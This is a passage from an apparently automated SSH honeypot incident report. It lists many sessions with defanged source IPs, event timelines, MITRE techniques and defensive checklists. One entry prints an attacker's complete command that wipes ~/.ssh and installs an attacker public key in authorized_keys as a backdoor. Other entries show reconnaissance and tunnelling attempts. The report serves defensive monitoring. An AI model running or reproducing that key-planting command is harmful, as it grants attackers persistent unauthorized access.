**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7736bb6cf9

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-07-28 05:27 |
| **Last Seen** | 2026-07-28 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:27:26` | `cowrie.session.connect` |
| `2026-07-28 05:27:26` | `cowrie.client.version` |
| `2026-07-28 05:27:26` | `cowrie.client.kex` |
| `2026-07-28 05:27:27` | `cowrie.login.success` |
| `2026-07-28 05:27:28` | `cowrie.session.params` |
| `2026-07-28 05:27:28` | `cowrie.command.input` |
| `2026-07-28 05:27:28` | `cowrie.command.failed` |
| `2026-07-28 05:27:28` | `cowrie.log.closed` |
| `2026-07-28 05:27:29` | `cowrie.session.params` |
| `2026-07-28 05:27:29` | `cowrie.command.input` |
| `2026-07-28 05:27:29` | `cowrie.session.file_download` |
| `2026-07-28 05:27:29` | `cowrie.log.closed` |
| `2026-07-28 05:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796d7a78f797

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-07-28 05:27 |
| **Last Seen** | 2026-07-28 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:27:30` | `cowrie.session.connect` |
| `2026-07-28 05:27:30` | `cowrie.client.version` |
| `2026-07-28 05:27:30` | `cowrie.client.kex` |
| `2026-07-28 05:27:31` | `cowrie.login.success` |
| `2026-07-28 05:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17aad2ac680c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-07-28 05:27 |
| **Last Seen** | 2026-07-28 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:27:31` | `cowrie.session.connect` |
| `2026-07-28 05:27:31` | `cowrie.client.version` |
| `2026-07-28 05:27:31` | `cowrie.client.kex` |
| `2026-07-28 05:27:32` | `cowrie.login.success` |
| `2026-07-28 05:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86da20846f3e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 05:30 |
| **Last Seen** | 2026-07-28 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:30:56` | `cowrie.session.connect` |
| `2026-07-28 05:30:56` | `cowrie.client.version` |
| `2026-07-28 05:30:56` | `cowrie.client.kex` |
| `2026-07-28 05:30:57` | `cowrie.login.success` |
| `2026-07-28 05:30:57` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:30:57` | `cowrie.direct-tcpip.data` |
| `2026-07-28 05:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57198f57bfb

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-28 05:34 |
| **Last Seen** | 2026-07-28 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:34:30` | `cowrie.session.connect` |
| `2026-07-28 05:34:31` | `cowrie.client.version` |
| `2026-07-28 05:34:31` | `cowrie.client.kex` |
| `2026-07-28 05:34:31` | `cowrie.login.success` |
| `2026-07-28 05:34:32` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba52fdd18c2c

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-28 05:44 |
| **Last Seen** | 2026-07-28 05:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:44:39` | `cowrie.session.connect` |
| `2026-07-28 05:44:40` | `cowrie.client.version` |
| `2026-07-28 05:44:40` | `cowrie.client.kex` |
| `2026-07-28 05:44:43` | `cowrie.login.success` |
| `2026-07-28 05:44:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd7542d8bce

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-28 05:44 |
| **Last Seen** | 2026-07-28 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:44:54` | `cowrie.session.connect` |
| `2026-07-28 05:44:54` | `cowrie.client.version` |
| `2026-07-28 05:44:54` | `cowrie.client.kex` |
| `2026-07-28 05:44:55` | `cowrie.login.success` |
| `2026-07-28 05:44:56` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b951d6d2687

| Field | Detail |
|---|---|
| **Source IP** | `169.58.4[.]219` |
| **First Seen** | 2026-07-28 05:47 |
| **Last Seen** | 2026-07-28 05:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:47:48` | `cowrie.session.connect` |
| `2026-07-28 05:47:48` | `cowrie.client.version` |
| `2026-07-28 05:47:48` | `cowrie.client.kex` |
| `2026-07-28 05:47:50` | `cowrie.login.success` |
| `2026-07-28 05:47:53` | `cowrie.session.params` |
| `2026-07-28 05:47:53` | `cowrie.command.input` |
| `2026-07-28 05:47:54` | `cowrie.log.closed` |
| `2026-07-28 05:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.58.4[.]219` to AbuseIPDB if not already reported
- [ ] Block `169.58.4[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c21449fc7f

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-28 05:50 |
| **Last Seen** | 2026-07-28 05:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:50:06` | `cowrie.session.connect` |
| `2026-07-28 05:50:06` | `cowrie.client.version` |
| `2026-07-28 05:50:06` | `cowrie.client.kex` |
| `2026-07-28 05:50:08` | `cowrie.login.success` |
| `2026-07-28 05:50:08` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1184c7fbed19

| Field | Detail |
|---|---|
| **Source IP** | `34.14.36[.]213` |
| **First Seen** | 2026-07-28 05:56 |
| **Last Seen** | 2026-07-28 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:56:26` | `cowrie.session.connect` |
| `2026-07-28 05:56:26` | `cowrie.login.success` |
| `2026-07-28 05:56:26` | `cowrie.session.params` |
| `2026-07-28 05:56:26` | `cowrie.command.input` |
| `2026-07-28 05:56:26` | `cowrie.command.input` |
| `2026-07-28 05:56:26` | `cowrie.command.failed` |
| `2026-07-28 05:56:26` | `cowrie.command.input` |
| `2026-07-28 05:56:27` | `cowrie.log.closed` |
| `2026-07-28 05:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.36[.]213` to AbuseIPDB if not already reported
- [ ] Block `34.14.36[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fe85db9f42

| Field | Detail |
|---|---|
| **Source IP** | `34.14.36[.]213` |
| **First Seen** | 2026-07-28 05:56 |
| **Last Seen** | 2026-07-28 05:56 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:56:39` | `cowrie.session.connect` |
| `2026-07-28 05:56:39` | `cowrie.login.success` |
| `2026-07-28 05:56:40` | `cowrie.session.params` |
| `2026-07-28 05:56:40` | `cowrie.command.input` |
| `2026-07-28 05:56:40` | `cowrie.command.failed` |
| `2026-07-28 05:56:56` | `cowrie.log.closed` |
| `2026-07-28 05:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.36[.]213` to AbuseIPDB if not already reported
- [ ] Block `34.14.36[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b899887d94

| Field | Detail |
|---|---|
| **Source IP** | `34.14.36[.]213` |
| **First Seen** | 2026-07-28 05:56 |
| **Last Seen** | 2026-07-28 05:56 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:56:41` | `cowrie.session.connect` |
| `2026-07-28 05:56:41` | `cowrie.login.success` |
| `2026-07-28 05:56:42` | `cowrie.session.params` |
| `2026-07-28 05:56:42` | `cowrie.command.input` |
| `2026-07-28 05:56:56` | `cowrie.log.closed` |
| `2026-07-28 05:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.36[.]213` to AbuseIPDB if not already reported
- [ ] Block `34.14.36[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a04eaf182b6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 05:58 |
| **Last Seen** | 2026-07-28 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:58:02` | `cowrie.session.connect` |
| `2026-07-28 05:58:02` | `cowrie.client.version` |
| `2026-07-28 05:58:02` | `cowrie.client.kex` |
| `2026-07-28 05:58:02` | `cowrie.login.success` |
| `2026-07-28 05:58:02` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:58:02` | `cowrie.direct-tcpip.data` |
| `2026-07-28 05:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6acc16617297

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 06:03 |
| **Last Seen** | 2026-07-28 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:03:17` | `cowrie.session.connect` |
| `2026-07-28 06:03:17` | `cowrie.client.version` |
| `2026-07-28 06:03:17` | `cowrie.client.kex` |
| `2026-07-28 06:03:17` | `cowrie.login.success` |
| `2026-07-28 06:03:18` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:03:18` | `cowrie.direct-tcpip.data` |
| `2026-07-28 06:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e650a9eae6ef

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-07-28 06:09 |
| **Last Seen** | 2026-07-28 06:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:09:11` | `cowrie.session.connect` |
| `2026-07-28 06:09:11` | `cowrie.client.version` |
| `2026-07-28 06:09:11` | `cowrie.client.kex` |
| `2026-07-28 06:09:12` | `cowrie.login.success` |
| `2026-07-28 06:09:13` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2148a8aededc

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-28 06:09 |
| **Last Seen** | 2026-07-28 06:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:09:18` | `cowrie.session.connect` |
| `2026-07-28 06:09:18` | `cowrie.client.version` |
| `2026-07-28 06:09:18` | `cowrie.client.kex` |
| `2026-07-28 06:09:19` | `cowrie.login.success` |
| `2026-07-28 06:09:20` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09a3957f2c1

| Field | Detail |
|---|---|
| **Source IP** | `20.46.45[.]121` |
| **First Seen** | 2026-07-28 06:12 |
| **Last Seen** | 2026-07-28 06:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:12:27` | `cowrie.session.connect` |
| `2026-07-28 06:12:27` | `cowrie.client.version` |
| `2026-07-28 06:12:27` | `cowrie.client.kex` |
| `2026-07-28 06:12:29` | `cowrie.login.success` |
| `2026-07-28 06:12:29` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.46.45[.]121` to AbuseIPDB if not already reported
- [ ] Block `20.46.45[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a836aa54b5c4

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-07-28 06:12 |
| **Last Seen** | 2026-07-28 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:12:38` | `cowrie.session.connect` |
| `2026-07-28 06:12:39` | `cowrie.client.version` |
| `2026-07-28 06:12:39` | `cowrie.client.kex` |
| `2026-07-28 06:12:40` | `cowrie.login.success` |
| `2026-07-28 06:12:40` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c1b3404f9b

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-07-28 06:14 |
| **Last Seen** | 2026-07-28 06:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:14:42` | `cowrie.session.connect` |
| `2026-07-28 06:14:43` | `cowrie.client.version` |
| `2026-07-28 06:14:43` | `cowrie.client.kex` |
| `2026-07-28 06:14:50` | `cowrie.login.success` |
| `2026-07-28 06:14:51` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce8cd7b2ad2

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-28 06:14 |
| **Last Seen** | 2026-07-28 06:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:14:57` | `cowrie.session.connect` |
| `2026-07-28 06:14:58` | `cowrie.client.version` |
| `2026-07-28 06:14:58` | `cowrie.client.kex` |
| `2026-07-28 06:15:01` | `cowrie.login.success` |
| `2026-07-28 06:15:01` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd95be8e1ce

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-28 06:20 |
| **Last Seen** | 2026-07-28 06:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:20:07` | `cowrie.session.connect` |
| `2026-07-28 06:20:08` | `cowrie.client.version` |
| `2026-07-28 06:20:08` | `cowrie.client.kex` |
| `2026-07-28 06:20:10` | `cowrie.login.success` |
| `2026-07-28 06:20:11` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efe3dd52c0a

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-28 06:20 |
| **Last Seen** | 2026-07-28 06:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:20:20` | `cowrie.session.connect` |
| `2026-07-28 06:20:21` | `cowrie.client.version` |
| `2026-07-28 06:20:21` | `cowrie.client.kex` |
| `2026-07-28 06:20:22` | `cowrie.login.success` |
| `2026-07-28 06:20:22` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c907f42f8d41

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 06:24 |
| **Last Seen** | 2026-07-28 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:24:48` | `cowrie.session.connect` |
| `2026-07-28 06:24:48` | `cowrie.client.version` |
| `2026-07-28 06:24:48` | `cowrie.client.kex` |
| `2026-07-28 06:24:48` | `cowrie.login.success` |
| `2026-07-28 06:24:49` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:24:49` | `cowrie.direct-tcpip.data` |
| `2026-07-28 06:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626c3cf70208

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 06:32 |
| **Last Seen** | 2026-07-28 06:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:32:43` | `cowrie.session.connect` |
| `2026-07-28 06:32:43` | `cowrie.client.version` |
| `2026-07-28 06:32:43` | `cowrie.client.kex` |
| `2026-07-28 06:32:43` | `cowrie.login.success` |
| `2026-07-28 06:32:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:32:43` | `cowrie.direct-tcpip.data` |
| `2026-07-28 06:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7075c77a3d02

| Field | Detail |
|---|---|
| **Source IP** | `31.173.29[.]136` |
| **First Seen** | 2026-07-28 06:33 |
| **Last Seen** | 2026-07-28 06:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
